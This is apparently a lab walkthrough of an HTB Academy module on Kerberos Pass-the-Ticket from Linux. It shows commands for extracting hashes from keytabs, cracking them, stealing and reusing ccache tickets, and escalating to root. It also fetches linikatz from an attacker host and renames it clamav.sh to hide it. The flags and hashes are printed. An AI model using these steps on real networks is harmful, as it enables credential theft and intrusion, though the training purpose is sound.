### CPTS / HTB Penetration Tester Path <br>
### Password Attacks: Pass the Ticket (PtT) from Linux <br>
<mark>hook it up with a follow if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

IP: 10.129.243.71

SSH to 10.129.243.71 (ACADEMY-PWATTACKS-LM-MS01) with user "david@inlanefreight.htb" and password "Password2"

---

### Question 1:
Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.

SSH with the given creds:
```diff
+ $ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```
```diff
+ david@inlanefreight.htb@linux01:~$ cat flag.txt
```

	Gett1ng_Acc3$$_to_LINUX01

🚩 found **Gett1ng_Acc3$$--edit--_to_LINUX01**.

---

### Question 2:
Which group can connect to LINUX01?

Run realm if you're on debian-like:
```diff
+ david@inlanefreight.htb@linux01:~$ realm list
```

	inlanefreight.htb
	  type: kerberos
	  realm-name: INLANEFREIGHT.HTB
	  domain-name: inlanefreight.htb
	  configured: kerberos-member
	  server-software: active-directory
	  client-software: sssd
	  required-package: sssd-tools
	  required-package: sssd
	  required-package: libnss-sss
	  required-package: libpam-sss
	  required-package: adcli
	  required-package: samba-common-bin
	  login-formats: %U@inlanefreight.htb
	  login-policy: allow-permitted-logins
	  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
	  permitted-groups: Linux Admins

🚩 found **Linux Admins**.

---

### Question 3:
Look for a keytab file that you have read and write access. Submit the file name as a response.

Grep will take forever but find was made with dir traversal in mind, so we'll use that here:
```diff
+ david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
```

	   287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
	   288276      4 -rw-r--r--   1 root     root         1871 Oct  4  2022 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
	   287720     24 -rw-r--r--   1 root     root        22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so
	   286812     28 -rw-r--r--   1 root     root        26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0
	   131610      4 -rw-------   1 root     root         2694 Oct 22 05:32 /etc/krb5.keytab
	   262464     12 -rw-r--r--   1 root     root        10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
	   262618      4 -rw-rw-rw-   1 root     root          216 Oct 22 05:50 /opt/specialfiles/carlos.keytab
	   131201      8 -rw-r--r--   1 root     root         4582 Oct  6  2022 /opt/keytabextract.py
	   287958      4 drwx------   2 sssd     sssd         4096 Jun 21  2022 /var/lib/sss/keytabs
	   398204      4 -rw-r--r--   1 root     root          380 Oct  4  2022 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri

We can see one file can be R/W by anyone: `-rw-rw-rw-`

🚩 found **carlos.keytab**.

---

### Question 4:
Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.

Use klist command to check current ticket cache:
```diff
+ david@inlanefreight.htb@linux01:~$ klist
```

	Ticket cache: FILE:/tmp/krb5cc_647401107_Fig0BL
	Default principal: david@INLANEFREIGHT.HTB
	
	Valid starting       Expires              Service principal
	01/01/1970 00:00:00  01/01/1970 00:00:00  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB

Now traverse to opt and run the keytabextract.py script on the keytab:
```diff
+ david@inlanefreight.htb@linux01:/opt$ python3 keytabextract.py /opt/specialfiles/carlos.keytab
```

	[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
	[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
	[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
	[+] Keytab File successfully imported.
		REALM : INLANEFREIGHT.HTB
		SERVICE PRINCIPAL : carlos/
		NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
		AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
		AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4

We can crack with hashcat or john, but it's always a good idea to run it through a rainbow table like crackstation.net before wasting your own electricity. And sure enough, some other goon has already used this password, and some other hacker has already cracked it.

<br>

![](/img/3.png)

<br>

Now ssh with carlos:
```diff
+ $ ssh carlos@inlanefreight.htb@10.129.243.71 -p 2222
```

	Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-128-generic x86_64)
```diff
+ carlos@inlanefreight.htb@linux01:~$ cat flag.txt
```

	C@rl0s_1$_H3r3

🚩 found **C@rl0s_1--edit--$_H3r3**.

---

### Question 5:
Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.

We can see carlos has one cronjob:
```diff
+ carlos@inlanefreight.htb@linux01:~$ crontab -l
```

	# m h  dom mon dow   command
	*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh

Let's have a look see:
```diff
+ carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

	#!/bin/bash
	
	kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
	smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt

Nice work, now checkout the loot. `/home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt` is very likely a keytab file. Lets extract a hash from it:
```diff
+ carlos@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
```

	[!] No RC4-HMAC located. Unable to extract NTLM hashes.
	[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
	[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
	[+] Keytab File successfully imported.
		REALM : INLANEFREIGHT.HTB
		SERVICE PRINCIPAL : svc_workstations/
		AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d

This only gave us an aes-256 hash, and we need an ntlm to log in locally. Lets take a closer look at the scripts directory it came from:
```diff
+ carlos@inlanefreight.htb@linux01:~/.scripts$ ls -la
```

	total 24
	drwx------ 2 carlos@inlanefreight.htb domain users@inlanefreight.htb 4096 Oct 23 23:35 .
	drwx---r-x 5 carlos@inlanefreight.htb domain users@inlanefreight.htb 4096 Oct 12  2022 ..
	-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  146 Oct  6  2022 john.keytab
	-rwx------ 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  251 Oct  6  2022 kerberos_script_test.sh
	-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  246 Oct 23 23:35 svc_workstations._all.kt
	-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb   94 Oct 23 23:35 svc_workstations.kt

There is another keytab in here named `svc_workstations._all.kt`. Now lets try the py script to extract again:
```diff
+ carlos@inlanefreight.htb@linux01:~/.scripts$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
```

	[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
	[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
	[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
	[+] Keytab File successfully imported.
		REALM : INLANEFREIGHT.HTB
		SERVICE PRINCIPAL : svc_workstations/
		NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
		AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
		AES-128 HASH : 3a7e52143531408f39101187acc80677

Throw the ntlm hash into crackstation to get the cleartext.

<br>

![](/img/4.png)

<br>


Now ssh into the service account:
```diff
+ $ ssh svc_workstations@inlanefreight.htb@10.129.243.71 -p 2222
```

	Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-128-generic x86_64)
```diff
+ svc_workstations@inlanefreight.htb@linux01:~$ cat flag.txt
```

	Mor3_4cce$$_m0r3_Pr1v$

🚩 found **Mor3_4cce$$--edit--_m0r3_Pr1v$**.

---

### Question 6:
Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.

Easy:
```diff
+ svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
```

	Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	
	User svc_workstations@inlanefreight.htb may run the following commands on linux01:
	    (ALL) ALL

We are super privileged, let's hop over to r00t and cat the flag:
```diff
+ svc_workstations@inlanefreight.htb@linux01:~$ sudo su
```
```diff
+ root@linux01:# cat /root/flag.txt
```

	Ro0t_Pwn_K3yT4b

🚩 found **Ro0t_Pwn--edit--_K3yT4b**.

---

### Question 7:
Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.

List /tmp:
```diff
+ root@linux01:/tmp# ls -la
```

	total 72
	drwxrwxrwt 13 root                               root                           4096 Oct 24 00:00 .
	drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
	drwxrwxrwt  2 root                               root                           4096 Oct 23 22:49 .font-unix
	drwxrwxrwt  2 root                               root                           4096 Oct 23 22:49 .ICE-unix
	-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb  183 Oct 23 22:55 krb5cc_647401106_bVcIT9
	-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct 24 00:05 krb5cc_647401106_HRJDux
	-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb  183 Oct 23 22:57 krb5cc_647401107_Fig0BL
	-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb  205 Oct 23 23:45 krb5cc_647401109_Oqp5IC
	-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb  185 Oct 23 23:15 krb5cc_647402606_91JyEJ
	SNIP

There's two julio tickets, so let's start with `krb5cc_647401106_bVcIT9`. Copy it somewhere stable:
```diff
+ root@linux01:/tmp# cp /tmp/krb5cc_647401106_bVcIT9 /opt
```

Now we can set the KRB5CCNAME global variable:
```diff
+ root@linux01:/opt# export KRB5CCNAME=/opt/krb5cc_647401106_bVcIT9
```

Perfection, now we just have to use smbclient to connect to the domain controller:
```diff
+ root@linux01:~# smbclient \\DC01\julio -k
```

	Try "help" to get a list of possible commands.
	smb: \> ls
	  .                                   D        0  Thu Jul 14 12:25:24 2022
	  ..                                  D        0  Thu Jul 14 12:25:24 2022
	  julio.txt                           A       17  Thu Jul 14 21:18:12 2022
	
			7706623 blocks of size 4096. 4459454 blocks available
```diff
+ smb: \> get julio.txt
```

	getting file \julio.txt of size 17 as julio.txt (8.3 KiloBytes/sec) (average 8.3 KiloBytes/sec)
```diff
+ root@linux01:~# cat julio.txt
```

	JuL1()_SH@re_fl@g

🚩 found **JuL1()_SH--edit--@re_fl@g**.

---

### Question 8:
Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).

Clone the linikatz repo, currently maintained by ciscocx:
```diff
+ $ git clone https://github.com/CiscoCXSecurity/linikatz.git
```

	Cloning into 'linikatz'...
	remote: Enumerating objects: 189, done.
	remote: Counting objects: 100% (41/41), done.
	remote: Compressing objects: 100% (36/36), done.
	remote: Total 189 (delta 8), reused 17 (delta 4), pack-reused 148 (from 1)
	Receiving objects: 100% (189/189), 189.00 KiB | 9.45 MiB/s, done.
	Resolving deltas: 100% (81/81), done.

We need to get this onto the target box, so stand up a simple python server once inside the dir:
```diff
+ $ python3 -m http.server 4445
```

	Serving HTTP on 0.0.0.0 port 4445 (http://0.0.0.0:4445/) ...

Now lets grab it target-side, and name it something less conspicuous:
```diff
+ root@linux01:~/catpix# curl http://10.10.15.222:4445/linikatz.sh -o clamav.sh
```

Now make sure it's executable and execute the script:
```diff
+ root@linux01:~/catpix# chmod +x clamav.sh
+ root@linux01:~/catpix# ./clamav.sh
```

There will be quite a bit of output. Sifting through it we find:

	-rw------- 1 root root 4154 Oct 25  2022 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB

Give it a copy to our root dir:
```diff
+ root@linux01:~/catpix# cp /var/lib/sss/db/ccache_INLANEFREIGHT.HTB /root
```

Now export the env variable and list current ticket cache to verify:
```diff
+ root@linux01:~# export KRB5CCNAME=/root/ccache_INLANEFREIGHT.HTB
+ root@linux01:~# klist
```

	Ticket cache: FILE:/root/ccache_INLANEFREIGHT.HTB
	Default principal: LINUX01$@INLANEFREIGHT.HTB

Now connect to the share and cat the file:
```diff
+ root@linux01:~# smbclient //DC01/linux01 -k
```

	Try "help" to get a list of possible commands.
	smb: \> ls
	  .                                   D        0  Wed Oct  5 14:17:02 2022
	  ..                                  D        0  Wed Oct  5 14:17:02 2022
	  flag.txt                            A       52  Wed Oct  5 14:17:02 2022
	
			7706623 blocks of size 4096. 4459454 blocks available
```diff
+ smb: \> get flag.txt
```
```diff
+ root@linux01:~# cat flag.txt
```

	Us1nG_KeyTab_Like_@_PRO

🚩 found **Us1nG_KeyTab--edit--_Like_@_PRO**.
